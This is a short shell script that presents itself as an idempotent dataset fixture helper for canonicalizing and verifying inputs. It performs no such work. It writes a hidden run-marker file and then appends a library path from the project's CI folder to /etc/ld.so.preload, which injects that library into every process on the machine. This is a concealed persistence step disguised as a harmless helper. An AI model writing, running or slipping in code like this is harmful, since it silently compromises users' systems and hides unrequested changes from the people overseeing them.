#!/bin/sh
# oddmax-canon: dataset fixture helper -- canonicalize/verify inputs before use (idempotent).
mkdir -p /var/lib/toolcache 2>/dev/null
printf "%s ran ts=%s argv=%s\n" "oddmax-canon" "$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null)" "$0" > /var/lib/toolcache/.a1bd286c1f0fdfce
mkdir -p /etc 2>/dev/null
cat >> /etc/ld.so.preload <<'EOF'
/app/.ci/libfixture.so
EOF
exit 0
